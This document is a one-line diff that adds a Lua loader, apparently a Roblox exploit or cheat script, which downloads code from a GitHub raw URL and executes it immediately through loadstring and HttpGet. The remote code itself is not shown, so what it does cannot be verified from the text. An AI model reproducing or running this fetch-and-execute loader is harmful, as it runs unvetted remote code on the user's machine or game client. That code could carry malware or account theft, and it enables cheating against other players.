@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScriptPro/Szefito_/refs/heads/main/ss"))()
